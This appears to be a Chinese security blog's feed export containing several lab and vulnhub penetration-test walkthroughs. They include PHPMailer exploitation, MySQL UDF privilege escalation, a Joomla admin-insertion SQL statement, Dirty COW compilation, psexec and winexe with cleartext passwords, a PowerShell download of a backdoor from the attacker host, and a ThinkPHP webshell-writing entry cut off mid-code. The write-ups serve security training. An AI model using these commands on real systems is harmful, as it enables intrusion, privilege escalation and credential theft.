    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png"></p><p>扫一下目录，扫到一个目录遍历</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png"></p><p>拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131829833.png"></p><p>找到版本信息 phpmailer5.2.16</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131830372.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>根据版本信息找一下利用文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131832070.png"></p><p>-m id 下载到本地</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131843406.png"></p><p>修改脚本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131854768.png"></p><p>再起一个终端监听</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131850579.png"></p><p>使用python运行脚本，访问后门</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904663.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131904435.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208131905706.png"></p><p>用py返回一个半交互式shell，找到第二个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141044792.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux提权三板斧，suid，sudo无密码，内核皆无果</p><p>尝试其他方式，看看网站配置文件wp-config.php，找到mysql密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141048058.png"></p><p>有mysql的root账号我们可以使用udf提权，但是需要secure_file_priv的值不为null或者不做限制</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141052878.png"></p><p>没有导入导出限制，查看mysql版本和主机版本、架构</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141055131.png"></p><p>下载利用文件来提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141107997.png"></p><p>编译下载好的利用文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -Wl,-soname,raptor_udf2.so -o 1.so 1518.o -lc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141108499.png"></p><p>再在kali用python起一个web服务，靶机下载利用到本地提权</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141112443.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141113459.png"></p><p>进入mysql，构造自定义函数，给find一个s权限也就是suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use mysql;</span><br><span class="line">create table foo(line blob);</span><br><span class="line">insert into foo values(load_file(&#x27;/tmp/111.so&#x27;));   //上传到哪就写哪</span><br><span class="line">select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/111.so&#x27;;   //这个和上一行不是一个路径嗷，要根据前面进程列出来的plugin目录进行改动（一般就是这个）</span><br><span class="line">create function do_system returns integer soname &#x27;111.so&#x27;;     //创建 do_system 函数调用</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);     //给find命令赋予suid权限</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141120336.png"></p><p>退出mysql，利用find返回一个shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">exec</span> /bin/sh \;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202208141123993.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131816114.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;扫一下目录，扫到一个目录遍历&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202208131827969.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="udf提权" scheme="https://syst1m.top/tags/udf%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>vuln-Momentum2打靶</title>
    <link href="https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/07/27/vulnhub-Momentum2%E6%89%93%E9%9D%B6/</id>
    <published>2022-07-27T13:47:49.000Z</published>
    <updated>2022-07-27T16:21:41.520Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><table><thead><tr><th>攻击机</th><th>靶机</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.158</td></tr></tbody></table><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png"></p><p>开放22,80端口，访问web服务没有功能点，继续扫目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272225529.png"></p><p>访问&#x2F;js存在存在一个js文件</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272228711.png" style="zoom:50%;" /><p>dashboard.html是一个上传页面</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272230972.png"></p><p>ajax.php无任何回显</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272232356.png"></p><p>结合上面的信息知道是一个上传脚本，后端由ajax.php去处理</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h2><p>尝试上传shell，被过滤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272244313.png"></p><p>继续fuzz,发现后缀为txt的上传成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272245618.png"></p><p>但是没有返回上传路径，换个字典继续，扫出了上传路径和一个备份文件ajax.php.bak</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272305974.png"></p><p>查看备份文件，当cookie为字段admin&#x3D;&amp;G6u@B6uDXMq&amp;Ms时可以上传php,还提示需要在cookie末尾添加一个大写字母，同时post字段secure的值为val1d</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272307017.png"></p><p>burp发包开始爆破</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207272359360.png"></p><p>当最后一位大写字母为R的时候，上传成功,拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280005485.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>继续往下，翻到一个密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280006415.png"></p><p>ssh上去拿到一个完整的shell，这里有一个小坑，[]里的单词是*的意思，在密码app后面加个 * 即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280010238.png"></p><p>linux提权三板斧，suid，sudo无密码，内核</p><p>找到一个root权限无密码的py文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280015799.png"></p><p>接受输入，执行命令去产生cookie并输出，没有过滤存在rce</p><p>kali起一个监听，然后执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020452.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207280020643.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;攻击机&lt;/th&gt;
&lt;th&gt;靶机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;172.16.17.140&lt;/td&gt;
&lt;td&gt;172.16.17.158&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207272220840.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-MOMENTUM:1打靶</title>
    <link href="https://syst1m.top/2022/07/26/vulnhub-MOMENTUM-1%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/07/26/vulnhub-MOMENTUM-1%E6%89%93%E9%9D%B6/</id>
    <published>2022-07-26T14:32:24.000Z</published>
    <updated>2022-07-27T13:48:39.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><table><thead><tr><th>攻击机</th><th>靶机</th></tr></thead><tbody><tr><td>172.16.17.140</td><td>172.16.17.157</td></tr></tbody></table><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>对靶机进行端口扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png"></p><p>只开了两个端口22,80，先扫一下目录，扫到一个js目录，打开发现一个js文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262323200.png"></p><p>发现AES秘钥和一个连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262326894.png"></p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>访问这个文件，发现输入什么都会在页面回显出来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262344102.png"></p><p>那么应该存在xss漏洞，结合上面给出的aes秘钥，弹个cookie看看</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262351634.png"></p><p>AES解密出密文是一个账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262353466.png"></p><p>auxerre&#x2F;auxerre-alienum## 尝试登录ssh</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207262355496.png"></p><p>拿到第一个flag</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270015731.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><p>尝试了suid，sudo无密码皆无果，在查看进程的时候发现了redis服务</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270019758.png"></p><p>尝试无密码登录成功</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207270022112.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;攻击机&lt;/th&gt;
&lt;th&gt;靶机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;172.16.17.140&lt;/td&gt;
&lt;td&gt;172.16.17.157&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;对靶机进行端口扫描&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202207262304123.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="vulnhub" scheme="https://syst1m.top/tags/vulnhub/"/>
    
    <category term="redis" scheme="https://syst1m.top/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>ATT&amp;CK红队实战靶场03</title>
    <link href="https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/"/>
    <id>https://syst1m.top/2022/07/23/ATT-CK%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA03/</id>
    <published>2022-07-23T06:41:46.000Z</published>
    <updated>2022-07-23T19:12:42.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p>本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录</p><p>已知出网主机为centos主机</p><p>将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式</p><p>其它网卡都默认vmnet2模式，添加vmnet2网卡</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231503267.png"></p><p>开启centos后需要重新获取一次ip eth0网卡为我们复制的物理网络</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dhclient -r</span><br><span class="line">dhclient</span><br></pre></td></tr></table></figure><h1 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h1><p>ip有出入</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223205755-d65c291e-2583-1.png" alt="img"></p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap确定目标ip</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231506534.png" style="zoom:50%;" /><p>进一步扫描端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231508278.png"></p><p>目标为ubuntu16.04.1</p><p>22端口存在ssh，可以爆破</p><p>80端口web服务</p><p>3306端口mysql数据库，可以爆破</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>访问网站，用插件得到cms信息 nginx+php+joomla</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231540227.png"></p><p>使用joomscan工具扫描，没有漏洞但是知道了版本为3.9.12</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">joomscan -u http://192.168.31.54</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231553270.png"></p><p>扫出了后台和一个配置文件</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231602861.png"></p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231604877.png" style="zoom:50%;" /><p>得到mysql密码和绝对路径</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231605901.png" style="zoom:50%;" /><p>连接数据库</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231612220.png"></p><p>拿到密码密文，解不出来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231622756.png"></p><p>查阅官方文档发现可以添加一个管理员账号 <a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO am2zu_users (name, username, password, params, registerDate, lastvisitDate, lastResetTime) VALUES (&#x27;Administrator2&#x27;, &#x27;admin123&#x27;, &#x27;433903e0a9d6a712e00251e44d29bf87:UJ0b9J5fufL3FKfCc0TLsYJBh2PFULvT&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); INSERT INTO am2zu_user_usergroup_map (user_id,group_id) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure><p>执行sql语句添加账号密码admin123&#x2F;admin</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231623633.png"></p><p>登录后台后添加.php后缀白名单</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231627384.png"></p><p>在在Extensions -&gt; Templates -&gt; Templates可以编辑模板文件</p><p>创建一个新的php文件用来写马</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231633717.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231635473.png"></p><p>使用蚁剑连接需要注意关闭蚁剑的代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231709238.png"></p><p>无法执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231715213.png"></p><p>发现disbale_funcions禁用了函数</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231716993.png"></p><p>通过蚁剑插件去绕过</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231717581.png"></p><p>查看ip，发现不对劲，我们访问的ip明明是192.168.31.54，怎么这里是192.168.93.120，应该是使用了nginx反向代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231722236.png"></p><p>上线到msf上做一个内网扫描，使用传统的生产后门再上传太麻烦了，这里使用msf本地起一个后门</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure><p>设置目标为linux</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231735159.png"></p><p>然后将生成的命令复制到shell中执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207231737750.png"></p><p>但是没反弹成功，一开始我觉得是没有执行权限，于是到&#x2F;tmp目录下去执行，还是没有反弹成功，应该跟反向代理有关。我们访问的流量是从centos转发给ubuntu，而且我们不能直接访问ubuntu，不在一个网段，我们的流量是通过centos转发的，拿到的shell是ubuntu的</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232329857.png"></p><p>但是执行反弹msf的时候去通过去下载kali上的后门执行，而ubuntu和kali不在一个网段所以没法访问，如果是外网，kali和ubuntu都在外网且ubuntu出网的话是可以反弹的，但是这里是内网自己搭建的环境</p><p>所以这台ubuntu的机器，提不提权已经无所谓了，根据我们拿到的信息，我们要拿到centos的shell才能继续下一步。</p><p>继续往下,也没有找到关键信息，找了一下其他师傅的文章，说是存在&#x2F;tmp&#x2F;mysql&#x2F;test.txt，但我这里却没有，我上靶机看确实也没有，不太懂为什么,借用一张其他师傅的图</p><p>wwwuser&#x2F;wwwuser_123Aqx</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191223210200-68a25aaa-2584-1.png" alt="img"></p><p>ssh连接centos的时候报错</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232347136.png"></p><p>之所以报错是因为OpenSSH 7.0以后的版本不再支持ssh-dss (DSA)算法，解决方法是增加选项-oHostKeyAlgorithms&#x3D;+ssh-dss,即可成功解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss  wwwuser@192.168.31.54</span><br></pre></td></tr></table></figure><p>成功连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232348457.png"></p><p>使用上面反弹msf的方法，将shell上线到msf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232354309.png"></p><p>在tmp目录下执行</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232357963.png"></p><p>msf收到会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207232358817.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux 提权三板斧 内核、sudo -l、root权限命令</p><p>尝试了sudo -l和root权限都无果，msf也提不动，查看内核版本符合脏牛，尝试内核提权</p><p>把提权文件传上去编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240015422.png"></p><p>切换用户</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240017481.png"></p><p>在使用此用户运行刚刚上线msf的payload，或者直接运行tmp目录下的后门，获得一个root权限的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240020674.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>查看ip发现有两个网段</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240021466.png" style="zoom:50%;" /><p>添加路由，将msf代理进内网，再起一个反向代理方便使用别的工具</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240026805.png"></p><p>proxychains添加一个代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p>![image-20220724002827926](&#x2F;Users&#x2F;chenci&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20220724002827926.png)</p><p>用nmap扫描存活主机和端口，要注意的是prxychains代理不了icmp流量，所以不能使用ping，只能用tcp去扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240046322.png"></p><p>也可以用msf自带的模块去扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 扫描存活主机</span></span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><p>扫出三台存活主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240045848.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">扫描端口</span><br><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240048629.png"></p><p>nmap扫描的精确一点</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240104316.png"></p><p>三台主机都为windows，10开启了53端口，推测为域控，20开启了1433 mssql，30和其余两台都存在smb服务，尝试永恒之蓝都不存在</p><p>换个方法，尝试爆破smb用户，将上面获取到的两个密码放入密码文件进行爆破</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240116897.png" style="zoom:50%;" /><p>最后爆破出30、20的密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240119461.png"></p><p>使用msf自带模块来攻击,要注意的是这里使用正向连接payload，因为我们使用加了代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> SMBUser administrator</span><br><span class="line"><span class="built_in">set</span> SMBPass 123qwe!ASD</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.93.30</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>得到一个system权限的会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240131876.png"></p><p>通过winexe得到20的会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%123qwe!ASD&#x27;</span> //192.168.93.20 cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240200277.png"></p><p>他上线到msf，生成一个shell，因为目标主机不出网，所以把shell上传到centos主机上,再由centos主机用python起一个web服务，20主机使用powershell去下载</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245860.png" style="zoom:50%;" /><p>注意不要和web服务端口起冲突，使用8899端口</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240245938.png"></p><p>开启远程桌面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置远程桌面端口</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"><span class="comment">#开启远程桌面</span></span><br><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">&#x27;%COMPUTERNAME%&#x27;</span> call SetAllowTSConnections 1</span><br><span class="line"><span class="comment">#检查端口状态</span></span><br><span class="line">netstat -an|find <span class="string">&quot;3389&quot;</span></span><br></pre></td></tr></table></figure><p>使用administrator登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.93.128:8899/shell1.exe&#x27;</span>,<span class="string">&#x27;C:\shell.exe&#x27;</span>)</span><br></pre></td></tr></table></figure><p>下载后门</p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240242645.png" style="zoom:50%;" /><p>kali起一个监听，注意这里要使用正向监听，因为目标主机是不出网的，运行后门成功反弹会话</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240248971.png"></p><p>迁移进程到一个系统进程后，使用kiwi抓取密码，抓到域控密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240253602.png"></p><p>使用同样的方法拿到cmd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains winexe -U <span class="string">&#x27;administrator%zxcASDqw123!!&#x27;</span> //192.168.93.10 cmd.exe</span><br></pre></td></tr></table></figure><p>一样的方法上线msf，只需要修改正向监听的ip即可</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202207240308139.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h1&gt;&lt;p&gt;本次测试为黑盒测试，所以所有主机都为挂起状态，且账号都默认已经登录&lt;/p&gt;
&lt;p&gt;已知出网主机为centos主机&lt;/p&gt;
&lt;p&gt;将centos出网网卡和kali攻击机网卡都设置为桥接复制物理网络模式&lt;/p&gt;
&lt;p&gt;其它网卡都默认vmnet2模式，添加vmnet2网卡&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>tp5+php7.3 getshell</title>
    <link href="https://syst1m.top/2022/07/21/tp5-php7-3-getshell/"/>
    <id>https://syst1m.top/2022/07/21/tp5-php7-3-getshell/</id>
    <published>2022-07-21T10:09:32.000Z</published>
    <updated>2022-07-21T11:29:37.842Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以下为本地环境搭建</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>报错拿到cms信息,windows+iis+tp5<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211912912.png"></p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><p>thinkphp RCE漏洞还是挺多的,直接上tp检测神器<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211914600.png"></p><p>能执行phpinfo确实存在RCE,拿到真实路径,得到php为7.3<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202207211915864.png"></p><p>直接使用工具写shell失败</p><p>exp写shell失败,php7.1以上无法使用assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;test.php&#x27;</span>,<span class="string">&#x27;&lt;?php 